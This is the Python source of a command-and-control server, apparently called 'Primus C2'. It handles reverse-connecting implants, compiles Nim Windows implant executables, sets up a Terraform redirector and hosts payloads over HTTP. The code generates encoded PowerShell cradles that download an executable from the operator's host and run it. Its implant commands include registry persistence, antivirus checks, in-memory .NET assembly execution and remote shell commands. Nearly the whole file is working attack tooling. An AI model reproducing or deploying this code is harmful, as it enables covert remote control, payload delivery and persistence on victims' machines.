import socket
import threading
from prettytable import PrettyTable
import time 
from datetime import datetime
import string, random, os
import os.path
import shutil
import subprocess
import fcntl
import struct
from http.server import HTTPServer, SimpleHTTPRequestHandler
import http.server
import base64
import randomname
from Cryptodome.PublicKey import RSA
import re
import atexit
#from rich import print
from rich.progress import track
import secrets
import colorama
from colorama import Fore, Back, Style
import readline



def banner():
    print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
    print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
    print('╩  ┴└─┴┴ ┴└─┘└─┘  ╚═╝')


def help():
    print(Fore.CYAN + '''
    ------------------------------------------------------------------------------------------------------
    Menu Commands
    ------------------------------------------------------------------------------------------------------
    listeners -g                --> Generate a new listener on desired interface
    nimplant                    --> Generate a compiled exe payload written in nim with advanced capabilities for windows
    sessions -l                 --> List callbacks
    sessions -i <sessions_val>  --> Enter a callback session
    use <sessions_val>          --> Enter a callback session
    pwsh_cradle                 --> Generate a pwsh cradle for a payload on the payloads server
    kill <sessions_val>         --> Terminate active callback
    exit                        --> exit from the server

    Implant Commands
    ------------------------------------------------------------------------------------------------------
    background                  --> Backgrounds current sessions
    persist                     --> Establish persistance trough registry keys(needs to be in the same
                                    dir as the implant on target disk)
    exit                        --> Terminate current session
    GetAV                       --> Get the current AV running
    pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
    execute-ASM <file> <args>   --> Execute .NET assembly from memory   
    ls                          --> List files in current directory
    cd <dir>                    --> Change current working directory
    pwd                         --> Print current working directory
    shell                       --> Run Windows CMD commands on target
    ''')

def help_implant():
    print(Fore.CYAN +'''
    ------------------------------------------------------------------------------------------------------
    Implant Commands
    ------------------------------------------------------------------------------------------------------
    background                  --> Backgrounds current sessions
    persist                     --> Establish persistance trough registry keys(needs to be in the same
                                    dir as the implant on target disk)
    exit                        --> Terminate current session
    GetAV                       --> Get the current AV running
    pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
    execute-ASM <file> <args>   --> Execute .NET assembly from memory
    ls                          --> List files in current directory
    cd <dir>                    --> Change current working directory
    pwd                         --> Print current working directory
    shell                       --> Run Windows CMD commands on target
    ''')


def listener_handler(): # Function to handle incoming connections and send bytes over the socket
    try:
        sock.bind((host_ip, int(host_port)))
    except (OSError):
        print(f'{Fore.RED}[-] Adress already in use, please try another one')
    if listen_choice == "3":
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {re_ip_str}:{host_port} ')
    else:
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting callback from implants on {host_ip}:{host_port}')
    
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.daemon = True
    t1.start()
    

    
def fix_base64_padding(base64_string):
    # Calculate the number of padding characters needed
    missing_padding = len(base64_string) % 4
    # Add the necessary padding
    if missing_padding:
        base64_string += b'=' * (4 - missing_padding)
    return base64_string

def comm_in(target_id):
    try:
        print(f'{Fore.LIGHTYELLOW_EX}[*] Awaiting response...')

        size_data = target_id.recv(1024).decode()
        print(f'{Fore.LIGHTYELLOW_EX}[*] Size of response is: {size_data}')
        size = int(size_data.strip())

        # Receive the entire message
        output = b""
        while len(output) < size:
            chunk = target_id.recv(1024)
            if not chunk:
                break
            output += chunk
        output1 = fix_base64_padding(output)
        decoded_output = base64.urlsafe_b64decode(output1)
        result = decoded_output.decode().strip() + '\n'

        # Clear the buffer before returning
        target_id.recv(1024)
        return result
    except:
        print(f'{Fore.RED}[-] An error occurred while receiving data from the target')
        pass

def comm_out(target_id, message):
    message = str(message + '\n')
    target_id.send(message.encode())
    

def kill_signal(target_id, message):
    message = str(message)
    target_id.send(message.encode())

def target_comm(target_id, targets, num):
    while True:
        message = input(f'{Fore.LIGHTWHITE_EX}{targets[num][3]}/{targets[num][1]}#> ') + '\n'
        if len(message) == 0:
            continue
        if message == 'help':
            help_implant()
            
        else:
            comm_out(target_id, message)
            if message == 'exit\n':
                target_id.send(message.encode())
                target_id.close()
                targets[num][7] = Fore.RED + 'Dead' + Fore.RESET
                break
            if message == 'background\n':
                break

            if message == 'help\n':
                help_implant()
           
             
            if message == 'GetAV':
                pass

            if message.split(" ")[0] == 'execute-ASM':
                #sendasm(message)
                global outfile
                args = list(message.split(" "))
                if len(args) > 0:
                    CSharpToNimByteArray(args[1])
                else:
                    print(Fore.LIGHTYELLOW_EX + "Please provide a file name as an argument.")
                    return                

                with open(outfile, "r") as f:
                    rub = f.read()
                size = os.stat(outfile).st_size
                print(f'{Fore.LIGHTYELLOW_EX}[*] Size of asm is: {size}')
                size1 = str(size)
                comm_out(target_id, size1)
                print(Fore.GREEN + "[+] Sent asm size to client")
                rub = str(rub) + "\n"
                target_id.send(rub.encode())
                print(Fore.GREEN + "[+] Sent asm to client")
                os.remove(outfile)
                response = comm_in(target_id)
                print(response)
                
                
            else:
                response = comm_in(target_id)
                if response == 'exit':
                    print(Fore.RED + '[-] The client has terminated the session')
                    target_id.close()
                    break
                print(response)


def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            key_validation = remote_target.recv(4096).decode()
            key_validation = base64.b64decode(key_validation).decode()
            if key_validation == auth_key:
                username = remote_target.recv(4096).decode()
                username = base64.b64decode(username).decode()
                admin = remote_target.recv(4096).decode()
                admin = base64.b64decode(admin).decode()
                operating_system = remote_target.recv(4096).decode()
                operating_system = base64.b64decode(operating_system).decode()
                host_name = remote_target.recv(4096).decode()
                host_name = base64.b64decode(host_name).decode()
                public_ip = remote_target.recv(4096).decode()
                public_ip = base64.b64decode(public_ip).decode()
                if admin == "1":
                    admin_value = 'Yes'
                elif username == 'root':
                    admin_value = 'Yes'
                else:
                    admin_value = 'No'
                if 'windows' in operating_system:
                    pay_val = 1
                else:
                    pay_val = 2
                cur_time = time.strftime("%H:%M:%S",time.localtime())
                date = datetime.now()
                time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
                
                if host_name is not None:
                    targets.append([remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active']) #Appending info to targets list
                    print(f'{Fore.GREEN}[+] Callback recieved from {host_name}@{public_ip}\n' +Fore.LIGHTYELLOW_EX +'Enter command#> ', end="")
                else: 
                    targets.append([remote_target, remote_ip[0], time_record, username, admin_value, operating_system, 'Active'])
                    print(f'{Fore.LIGHTYELLOW_EX}[+] Callback recieved from {remote_ip[0]}\n' + Fore.LIGHTYELLOW_EX+'Enter command#> ', end="")
            else:
                remote_target.close()
        except:
            pass



def nimplant():
    global host_ip
    global host_port
    random_name = randomname.get_name()
    compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    cwd_nim = os.getcwd()
    f_name= f'{compile_name}.nim'
    exe_file = f'{random_name}.exe'
    file_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant.nim')
    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
    if os.path.exists(file_loc):
        shutil.copy(file_loc, f_name)
        shutil.move(f_name, implant_loc)
    else:
        print(f'{Fore.RED}[-] implant.nim not found in {file_loc}')
    print(Fore.CYAN + '[*] Use listener address or specify other IP for implant to connect to: ')
    print(Fore.CYAN + '[*] 1. Listener adress')
    print(Fore.CYAN + '[*] 2. Other IP')
    imp_choice = input(Fore.LIGHTYELLOW_EX + '[#] Enter 1 or 2: ' + Fore.RESET)
    if imp_choice == "1":
        pass
    else:
        host_ip = input('[*] Specify IP: ')
    with open(f'{implant_loc}/{f_name}') as f:
        patch_host = f.read().replace('INPUT_IP', str(host_ip.strip()))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_host)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        patch_port = f.read().replace('INPUT_PORT', str(host_port))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_port)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        new_key = f.read().replace('AUTH_KEY', auth_key)
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(new_key)
        f.close()
    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip", "--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
    for _ in track(range(4), description=f'[green][*] Compiling executeable {exe_file}...'):
        process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        process.wait()
    implant_loc = os.path.join(implant_loc, exe_file)
    if os.path.exists(implant_loc):
        print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')   
    else:
        print(Fore.RED + '[-] An error occurred while compiling the implant')
    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
    os.remove(f'{implant_loc}/{f_name}')

def resolve_ip(interface):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(), 0x8915,  # SIOCGIFADDR
        struct.pack('256s', interface[:15].encode('utf-8'))
        )[20:24])
    
        

def pwsh_cradle():
    try:
        payload_name = input(Fore.LIGHTYELLOW_EX + '[*] Input payload name for transfer: ')
        cwd_payload = os.getcwd()
        check_file_loc = os.path.expanduser(f'{cwd_payload}/Payloads/{payload_name}')
        
        if os.path.exists(check_file_loc):
            runner_file = (''.join(random.choices(string.ascii_lowercase, k=8)))
            runner_file = f'{runner_file}.exe'
            random_exe = (''.join(random.choices(string.ascii_lowercase, k=6)))
            random_exe = f'{random_exe}.exe'
            payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
            print(f'{Fore.LIGHTGREEN_EX}[*] Payload server available at {host_ip}:8999')
            runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{host_ip}:8999/Payloads/{runner_file}')".encode('utf-16le')
            with open(runner_file, 'w') as f:
                f.write(f'powershell -c wget http://{host_ip}:8999/Payloads/{payload_name} -outfile {random_exe};Start-Process -FilePath {random_exe} ')
                f.close()
                shutil.move(runner_file, payload_loc)
            b64_runner = base64.b64encode(runner_cal_unencoded)
            b64_runner = b64_runner.decode()
            print(f'{Fore.CYAN}\n[+] B64 encoded payload\n\npowershell -e {b64_runner}')
            b64_runner_decoded = base64.b64decode(b64_runner).decode()
            print(f'{Fore.CYAN}\n[+] Unencoded payload\n\n{b64_runner_decoded}')
        else:
            print(f'{Fore.RED}[-] {check_file_loc} does not exist in payloads folder... Try another payload ')
    except(NameError):
        print(f'{Fore.RED}[*] Payload server not running yet.. start listener: <listener -g>')

def web_payload_server():
    
    http_handler = SimpleHTTPRequestHandler
    http_handler.log_message = lambda *args, **kwargs: None
    server = http.server.ThreadingHTTPServer((host_ip, 8999), http_handler)
    
    print(f'{Fore.GREEN}[+] Payload server is running at http://{host_ip}:8999')
    thread = threading.Thread(target = server.serve_forever)
    thread.daemon = True
    thread.start()
    

def redirector(LPORT):
    key_loc = os.path.expanduser('~/.ssh/id_rsa')
    if os.path.exists(key_loc):
        print(Fore.LIGHTGREEN_EX + '[+] Keypair already present...')
    else:
        print(Fore.LIGHTYELLOW_EX + '[*] Generating SSH keypair...')
        key = RSA.generate(2048)
        f = open("id_rsa", "wb")
        f.write(key.exportKey('PEM'))
        f.close()

        pubkey = key.publickey()
        f = open("id_rsa.pub", "wb")
        f.write(pubkey.exportKey('OpenSSH'))
        f.close()

        priv_key_loc = os.path.expanduser('id_rsa')
        pub_key_loc = os.path.expanduser('id_rsa.pub')
        shutil.move(priv_key_loc, key_loc)
        shutil.move(pub_key_loc, key_loc)

    old_cwd = os.getcwd()
    cwd = os.getcwd()
    terra_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform')
    redir_loc = os.path.expanduser(f'{cwd[:-3]}/Templates/redirector_template.tf')
    script_loc = os.path.expanduser(f'{cwd[:-3]}/Templates/script.sh')
    redir_copy_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform/redirector.tf')
    script_copy_loc = os.path.expanduser(f'{cwd[:-3]}/Terraform/script.sh')
    script_name = "script.sh"
    redirector_name = "redirector.tf"
    if os.path.exists(redir_loc):
        shutil.copy(redir_loc, redir_copy_loc)
        print(Fore.LIGHTYELLOW_EX +'[*] Patching listening port...')
        with open(f'{terra_loc}/{redirector_name}') as f:
            patch_host = f.read().replace('LPORT', str(LPORT))
        with open(f'{terra_loc}/{redirector_name}', 'w') as f:
            f.write(patch_host)
            f.close()
            
    if os.path.exists(script_loc):
        shutil.copy(script_loc, script_copy_loc)
        with open(f'{terra_loc}/{script_name}') as f:
            patch_host = f.read().replace('LPORT', str(LPORT))
        with open(f'{terra_loc}/{script_name}', 'w') as f:
            f.write(patch_host)
            f.close()
            print(Fore.GREEN +'[+] Listening port patched\n')
    
    print(Fore.LIGHTYELLOW_EX +'[*] Provisioning and configuring redirector... This will take a couple minutes')
    os.chdir(terra_loc)
    os.system("terraform init")
    terra_cmd = ["terraform", "apply", "-auto-approve"]
    process = subprocess.Popen(terra_cmd, stdout=subprocess.PIPE)
    output = process.stdout.read()
    redir_ip = re.findall(r'\b0mdroplet_ip_address \= \"(\d+\.\d+\.\d+.\d+)', output.decode('utf-8'))
    global re_ip_str
    re_ip_str = "".join(redir_ip)
    process.wait()

    print(Fore.LIGHTYELLOW_EX + '[*] Running socat relay trough SSH.. wait a moment.')
    subprocess.run(["ssh", f"root@{re_ip_str}", "/tmp/script.sh"],
        shell=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False)
    print(Fore.GREEN + '[+] Socat relay configured...')
    print(Fore.LIGHTYELLOW_EX + '[*] Setting up reverse port forward on localhost')
    os.system(f"ssh -N -R 4567:localhost:{host_port} root@{re_ip_str} &")
    os.chdir(old_cwd)


def CSharpToNimByteArray(inputfile, folder=False):
    global outfile
    if folder:
        files = os.listdir(inputfile)
        for file in files:
            print(f"{Fore.LIGHTYELLOW_EX}[*] Converting {file}")
            outfile = file + "NimByteArray.txt"
    
            with open(file, "rb") as f:
                hex_data = f.read().hex()
                hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
                hex_string = "0x" + hex_string
                with open(outfile, "w", encoding="utf-8") as out:
                    out.write(hex_string)
    
        print(Fore.GREEN + "[*] Results Written to the same folder")
    else:
        try:
            cwd_payload = os.getcwd()
            inputfile_path = os.path.expanduser(f'{cwd_payload}/Payloads')
            print(f"Converting {inputfile}")
            outfile = inputfile + "NimByteArray.txt"
            
            with open(f'{inputfile_path}/{inputfile}', "rb") as f:
                hex_data = f.read().hex()
                hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
                hex_string = "0x" + hex_string
                with open(outfile, "w", encoding="utf-8") as out:
                    out.write(hex_string)
            
            print(f"{Fore.GREEN}[*] Result Written to {outfile}")
        except:
            print(f"{Fore.RED}[-] File not found")

    # dos2unix conversion
    with open(outfile, "r") as f:
        content = f.read()
        with open(outfile, "w") as out:
            out.write(content.replace("\r\n", "\n"))

class MyCompleter(object):  # Custom completer

    def __init__(self, options):
        self.options = sorted(options)

    def complete(self, text, state):
        if state == 0:  # on first trigger, build possible matches
            if text:  # cache matches (entries that start with entered text)
                self.matches = [s for s in self.options 
                                    if s and s.startswith(text)]
            else:  # no text entered, all matches possible
                self.matches = self.options[:]

        # return match indexed by state
        try: 
            return self.matches[state]
        except IndexError:
            return None
   
def exit_handler():
    cwd = os.getcwd()
    print(Fore.LIGHTYELLOW_EX + '[*] Destroying redirector infrastructure...')
    terra_loc = os.path.expanduser(f'{cwd.strip("C2")}/Terraform')
    os.chdir(terra_loc)
    os.system("terraform destroy -auto-approve")

    try:
        print(Fore.LIGHTYELLOW_EX + '[*] Cleaning up files...')
        os.remove("script.sh")
        os.remove("redirector.tf")
        print(Fore.GREEN + '[+] Files succesfully cleaned')
        
    except:
        print(Fore.RED+'[-] File not found.')

if __name__ == '__main__':
    keywords = ["listeners -g", "nimplant", "sessions -l", "use ", "pwsh_cradle", "kill ", "sessions -i", "exit", "help", "background", "persist", "GetAV", "pwsh", "execute-ASM", "ls", "cd", "pwd", "eth0", "lo", "wlan0", "eth1"]
    completer = MyCompleter(keywords)
    readline.set_completer(completer.complete)
    readline.parse_and_bind('tab: complete')
    for kw in keywords:
        readline.add_history(kw)
    colorama.init(autoreset=True)
    targets = [] #store each socket connection
    listener_count = 0
    banner()
    kill_flag = 0
    global host_ip
    global host_port
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if not os.path.exists('Generated_Implants'):
            print(Fore.LIGHTYELLOW_EX + "[+] Creating Generated Implants Directory...")
            os.mkdir('Generated_Implants')
    if not os.path.exists('Payloads'):
            print(Fore.LIGHTYELLOW_EX + "[+] Creating Payloads Directory...")
            os.mkdir('Payloads')
    
    length_gen = secrets.SystemRandom()
    key_length = length_gen.randint(12,33)
    auth_key = (''.join(secrets.token_urlsafe(key_length)))
    print(f'{Fore.CYAN}[+] Key for this session is {auth_key}')


    while True:
        try:
            command = input(Fore.LIGHTYELLOW_EX +'Enter command#>' + Fore.RESET)
            if command == 'help':
                help()
            if command == 'listeners -g':
                try:
                    print(Fore.CYAN + '[*] 1. Interface')
                    print(Fore.CYAN + '[*] 2. IP-Address')
                    print(Fore.CYAN + '[*] 3. Listener with redirector\n ')
                    listen_choice = (input(Fore.LIGHTYELLOW_EX + '[*] Choose an option: ' + Fore.RESET))
                except (OSError, ValueError, TypeError):
                    print(Fore.RED + '[-] No such option... Please try again')
                
                if listen_choice == '1':
                    while True:
                        try:
                            host_ip = resolve_ip(input(Fore.CYAN + '[#] Enter the interface to listen on: '+ Fore.RESET))
                            host_port = int(input(Fore.CYAN + '[#] Enter listening port: '+ Fore.RESET))
                            break  # exit the loop if no exception was raised
                        except (OSError, ValueError, TypeError):
                            print(Fore.RED + '[-] No such Interface or port... Please try again')
                elif listen_choice == 2:
                    
                    while True:
                        try:
                            host_ip = input('[#] Enter the IP to listen on: ')
                            host_port = int(input('[#] Enter listening port: '))
                            break  # exit the loop if no exception was raised
                        except (OSError, ValueError, TypeError):
                            print('[-] No such IP or port... Please try again')
                elif listen_choice == '3':
                    host_ip = resolve_ip("lo")
                    host_port = int(input('[#] Enter listening port: '))
                    redirector(host_port)
                
                listener_handler()
                listener_count +=1
                web_payload_server()
            elif command == 'nimplant':
                if listener_count > 0:
                    nimplant()
                else:
                    print('[-] Cannot compile payload without active listener')
            if command == 'pwsh_cradle':
                pwsh_cradle()

            if command.split(" ")[0] == 'kill':
                try:
                    num = int(command.split(" ")[1])
                    target_id = (targets[num][0])
                    if targets[num][7] == 'Active':
                        kill_signal(target_id, 'exit')
                        targets[num][7] = 'Dead'
                        print(f'[-] Session {num} terminated')
                    else:
                        print('[-] Cannot interact with a dead session')
                except(IndexError, ValueError, NameError):
                    try:
                        print(f'Session {num} does not exist')
                    except NameError:
                        print('[-] no active sessions to kill')
            
            try:
                if command.split(" ")[0] == 'sessions':
                    session_counter = 0
                    if command.split(" ")[1] == '-l':
                        session_table = PrettyTable()
                        session_table.field_names = [Fore.CYAN +'Session','Username', 'Admin' ,'Status' ,'Target','Operating System','Check-in Time']
                        session_table.padding_width = 3
                        for target in targets:
                            session_table.add_row([session_counter, target[3],target[4],target[7], target[1], target[5],target[2]])
                            session_counter += 1
                        print(session_table)
                    if command.split(" ")[1] == '-i':
                        try:
                            num = int(command.split(" ")[2])
                            target_id = (targets[num])[0]
                            if (targets[num])[7] == 'Active':
                                target_comm(target_id, targets, num)
                            else: 
                                print(Fore.RED +'[-] Can not interact with Dead implant')
                        except IndexError:
                            try:
                                print(f'{Fore.RED}[-] Session {num} does not exist')
                            except(NameError):
                                print(Fore.RED + '[-] Please provide a session to interact with..')
            except(IndexError):
                print(Fore.LIGHTYELLOW_EX +'[*] Please providea flag.. eg <-l> or <-i>')
            if command.split(" ")[0] == 'use':
                try:
                    num = int(command.split(" ")[1])
                    target_id = (targets[num])[0]
                    if (targets[num])[7] == 'Active':
                        target_comm(target_id, targets, num)
                    else: 
                        print(Fore.RED +'[-] Can not interact with Dead implant')
                except (IndexError, TypeError):
                    print(f'{Fore.RED}[-] Session {num } does not exist' )
                    
            if command == 'exit':
                quit_message = input(Fore.LIGHTMAGENTA_EX + 'Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
                if quit_message == 'y':
                    for target in targets:
                        if target[7] == 'Dead':
                            pass
                        else:
                            comm_out(target[0], 'exit')
                    kill_flag = 1
                    if listener_count > 0:
                        sock.close()
                    break
                else:
                    continue
        except KeyboardInterrupt:
            quit_message = input(Fore.LIGHTMAGENTA_EX + 'Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
            if quit_message == 'y':
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        comm_out(target[0], 'exit')
                kill_flag = 1
                if listener_count > 0:
                    sock.close()
                break
            else:
                continue
atexit.register(exit_handler)